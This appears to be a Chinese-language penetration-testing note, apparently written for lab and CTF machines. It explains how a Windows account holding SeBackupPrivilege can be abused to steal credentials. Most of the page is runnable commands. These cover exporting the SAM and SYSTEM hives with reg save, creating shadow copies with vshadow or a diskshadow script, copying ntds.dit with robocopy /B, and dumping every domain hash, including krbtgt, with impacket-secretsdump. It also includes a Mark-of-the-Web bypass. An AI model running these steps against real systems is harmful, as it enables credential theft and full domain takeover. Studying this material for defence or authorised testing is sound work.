# 💥 SeBackupPrivilege 本地提權與憑證轉儲 (sebackupprivilege)

本文件說明 Windows/Active Directory 環境中擁有 `SeBackupPrivilege` 權限的利用## 🔍 漏洞成因與原理

`SeBackupPrivilege`（備份檔案和目錄特權）是 Windows 的一項重要權限，原本旨在授予備份軟體或系統管理員，讓其能繞過系統檔案的 **存取控制清單 (ACL)** 限制，以讀取並備份任何系統檔案（包括密碼雜湊檔案 `SAM`、Active Directory 資料庫 `ntds.dit` 等）。

如果普通使用者或服務帳戶被賦予了該特權，且該帳戶擁有對系統的互動登入（如 WinRM 或 RDP）權限，攻擊者即可濫用此權限讀取原本受保護的敏感系統檔案。然而，由於 `ntds.dit` 在域控制器上是被 Active Directory 服務常駐鎖定的（無法直接被一般方式複製），因此必須配合 **磁碟磁碟區陰影複製服務 (VSS, Volume Shadow Copy Service)** 建立檔案系統的快照，再利用支援備份模式的工具（如 `robocopy /B`）複製出鎖定的資料庫與金鑰，最後於本地端進行解密轉儲。

### 🛡️ 提取手法比較 (reg save vs 磁碟快照)
In 擁有 `SeBackupPrivilege` 特權時，有兩種主要的憑證提取方向：

| 提取手法 | 提取目標檔案 | 獲取憑證類型 | 適用場景與限制 |
| :--- | :--- | :--- | :--- |
| **`reg save` 註冊表導出** | 本地 `SAM`、`SYSTEM` 註冊表 | **本地帳戶** 雜湊值 (Local NTLM Hashes) | 適用於快速獲取該主機本地管理員 (Administrator) 的憑證。無法獲取 Active Directory 網域憑證。 |
| **建立快照 (vshadow / diskshadow)** | 網域資料庫 `ntds.dit`、`SYSTEM` 註冊表 | **全網域帳戶** 雜湊值 (Domain NTLM Hashes) | 必須在 **網域控制器 (Domain Controller)** 上執行，可用於導出網域中所有帳戶（如 `krbtgt`、域管理員等）的憑證。 |

---

## 🛠️ 常見利用與繞過技巧

### 1. 確認權限
在 Shell 中執行 `whoami /priv` 確認具有 `SeBackupPrivilege` 特權且為 `Enabled`：
```powershell
whoami /priv
# 輸出中需包含：SeBackupPrivilege - Back up files and directories - Enabled
```

### 2. 使用 reg save 導出本地帳戶憑證 (SAM & SYSTEM)
當在目標主機上（無論是成員主機或網域控制器）擁有 `SeBackupPrivilege` 特權時，可以直接執行 `reg save` 指令將登錄檔中的 `SAM` 與 `SYSTEM` 備份匯出。此操作不需使用 VSS 快照工具，可直接繞過檔案鎖定限制以獲取該主機本地帳戶的 NTLM 雜湊值（例如本地端 `Administrator`）。

#### 利用方法
1.  **匯出註冊表備份**：
    在擁有特權的 Shell 中執行以下指令：
    ```powershell
    reg save hklm\sam C:\Users\Public\sam.bak
    reg save hklm\system C:\Users\Public\system.bak
    ```
2.  **本地解密轉儲**：
    將這兩個備份檔下載回攻擊機後，使用 Impacket 的 `secretsdump` 進行本地解析：
    ```bash
    impacket-secretsdump -sam sam.bak -system system.bak LOCAL
    ```
    這會成功轉儲出該主機的本地管理員 (RID 500) 哈希值。

---

### 3. 獲取與提取 vshadow.exe (免安裝提取)
`vshadow.exe` 是微軟官方的磁碟區陰影複製服務 (VSS) 開發工具。若不想在實體機上安裝龐大的 Windows SDK 完整包，可使用 Windows 內建的指令直接從官方 SDK 的安裝包中提取出單一的 `vshadow.exe` 檔案：

1. **下載官方 SDK ISO 檔**：
   前往 [微軟官方 Windows SDK 下載頁面](https://learn.microsoft.com/en-us/windows/apps/windows-sdk/)，下載最新版 Windows SDK 或者是 Windows 10 SDK ISO 檔案。
2. **直接掛載下載下來的 ISO 檔**：
   在 Windows 系統中雙擊下載下來的 ISO 檔進行掛載，進入光碟機目錄，在 `Installers` 資料夾內找到名為 `Windows SDK Desktop Tools x86-x86_en-us.msi`（或包含 `Desktop Tools` 及 `x64` 關鍵字）的安裝檔。
   
   > [!warning] **智慧型應用程式控制 (MotW) 封鎖解決方案**
   > 從網路下載的 ISO 檔案會帶有 Mark of the Web (MotW) 標籤，若直接掛載，內部的 `.msi` 及其解壓出的檔案也會繼承此標籤，可能被 Windows「智慧型應用程式控制 (Smart App Control)」封鎖。
   > 
   > **方法一：掛載前先手動解除封鎖（最簡單）**
   > 對下載的 ISO 檔案按右鍵 ⭢ **內容** ⭢ 於最下方安全性欄位勾選 **「解除封鎖」** ⭢ 點擊 **套用**。重新掛載後裡面的檔案便不會帶有 MotW。
   > 
   > **方法二：使用 PowerShell 解除**
   > ```powershell
   > Unblock-File -Path "C:\path\to\your.iso"
   > ```
3. **使用 Windows 指令將其解壓**：
   在命令提示字元 (cmd) 中執行以下 Windows 指令，將該 `.msi` 檔案解壓縮到臨時資料夾：
   ```cmd
   msiexec /a "Windows SDK Desktop Tools x86-x86_en-us.msi" /qb TARGETDIR="C:\SDK_Dump"
   ```
4. **獲取 vshadow.exe**：
   解壓完成後進入 `C:\SDK_Dump\Windows Kits\10\bin\...\x86\`（路徑會因 SDK 版本稍有差異），即可百分之百安全地單獨取得官方原廠的 `vshadow.exe` 執行檔，隨後上傳至目標系統使用。

---

### 4. 建立磁碟快照並掛載 (vshadow 或 diskshadow)
對於正處於鎖定狀態的 `C:\Windows\NTDS\ntds.dit` 檔案，可選擇使用 Microsoft SDK 的 `vshadow.exe`，或者使用 Windows 內建的 `diskshadow` 工具建立快照並將其掛載為新磁碟機（如 `X:\`）：

*   **方法一：使用 vshadow.exe 建立並掛載**：
    ```powershell
    # 1. 建立快照並取得 Snapshot ID
    cmd.exe /c "vshadow.exe -nw -p C:"

    # 2. 將產生的 Snapshot ID 掛載到 X:\ 磁碟機
    cmd.exe /c "vshadow.exe -el={<SNAPSHOT_ID>},X:"
    ```

*   **方法二：使用 Windows 內建 diskshadow 腳本建立並掛載**：
    此方法不需要上傳額外的第三方執行檔，直接利用內建 of `diskshadow` 指令。由於 `diskshadow` 要求傳入腳本，且**腳本換行字元必須為 Windows (CRLF) 格式**，利用方式如下：
    
    1.  **建立腳本檔案 (如 shadow.txt)**：
        在本地端編輯含有以下內容的文字檔。
        
        > [!important] **腳本換行字元限制 (CRLF)**
        > Windows 內建的 `diskshadow` 工具在解析腳本時，要求腳本檔案的換行字元必須為 **Windows 格式 (CRLF，即 0D 0A)**。如果在 Linux (Kali) 端建立此檔案，預設為 Unix 格式 (LF，即 0A)，會造成 `diskshadow` 解析錯誤。必須透過 `unix2dos` 進行轉換，換行符號才會是 `0D 0A`。
        
        ```bash
        # 1. 建立並寫入腳本內容
        ┌──(kali㉿kali)-[~/Desktop]
        └─$ cat shadow.txt
        set context persistent nowriters
        set metadata C:\Windows\Temp\meta.cab
        add volume C: alias pwn
        create
        expose %pwn% X:

        # 2. 檢視換行符，此時為 0A (Unix LF)
        ┌──(kali㉿kali)-[~/Desktop]
        └─$ xxd shadow.txt | head -3
        00000000: 7365 7420 636f 6e74 6578 7420 7065 7273  set context pers
        00000010: 6973 7465 6e74 206e 6f77 7269 7465 7273  istent nowriters
        00000020: 0a73 6574 206d 6574 6164 6174 6120 433a  .set metadata C:

        # 3. 使用 unix2dos 進行格式轉換
        ┌──(kali㉿kali)-[~/Desktop]
        └─$ unix2dos shadow.txt     
        unix2dos: converting file shadow.txt to DOS format...

        # 4. 再次檢視換行符，已成功轉換為 0D 0A (Windows CRLF)
        ┌──(kali㉿kali)-[~/Desktop]
        └─$ xxd shadow.txt | head -3
        00000000: 7365 7420 636f 6e74 6578 7420 7065 7273  set context pers
        00000010: 6973 7465 6e74 206e 6f77 7269 7465 7273  istent nowriters
        00000020: 0d0a 7365 7420 6d65 7461 6461 7461 2043  ..set metadata C
        ```
    2.  **上傳腳本並執行**：
        將 `shadow.txt` 上傳至目標控制器，並在目標主機上以系統內建命令執行：
        ```powershell
        diskshadow /s C:\path\to\shadow.txt
        ```
        執行成功後，系統將會自動建立 `C:` 快照並掛載為 `X:\` 磁碟機。

---

### 5. 利用 Robocopy 備份模式複製檔案
使用 `robocopy` 的 `/B` (Backup mode) 參數，繞過安全存取控制限制，從掛載的快照磁碟機中複製出鎖定的資料庫與解密用的 `SYSTEM` 登錄檔：
```powershell
# 1. 複製 NTDS 資料庫
robocopy "X:\Windows\NTDS\" C:\Users\Public\ ntds.dit /B

# 2. 複製 SYSTEM 登錄檔以獲取 BootKey 解密金鑰
robocopy "X:\Windows\System32\config\" C:\Users\Public\ SYSTEM /B
```

### 6. 離線轉儲全域雜湊值 (secretsdump)
將這兩個檔案下載回攻擊機後，使用 Impacket 工具套件的 `secretsdump` 進行離線解密，提取域內所有帳戶的 NTLM 哈希值：
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[Poseidon]]（在透過 WinRM 登入 DC02 後，發現普通帳戶 `jackie` 擁有 `SeBackupPrivilege` 特權。攻擊者使用 `vshadow.exe` 建立快照並掛載至 `X:\`，再以 `robocopy /B` 成功拷貝出 `ntds.dit` 與 `SYSTEM`，回傳 Kali 後使用 `secretsdump` 成功還原出包括 `Administrator` 與 `krbtgt` 在內的全域雜湊值，為跨域信任攻擊提供了必要的金鑰）。
    *   [[Zeus]]（使用 `d.chambers` 憑證登入 `DC01` 域控後，發現其擁有 `SeBackupPrivilege` 權限。使用 `reg save` 將 `SAM` 和 `SYSTEM` 導出以獲取域控本地 Administrator 的 hash 接管控制；同時亦可使用 Windows 內建的 `diskshadow` 執行腳本建立快照掛載並以 `robocopy /B` 提取出 `ntds.dit` 和 `SYSTEM` 轉儲全網域認證憑證）。
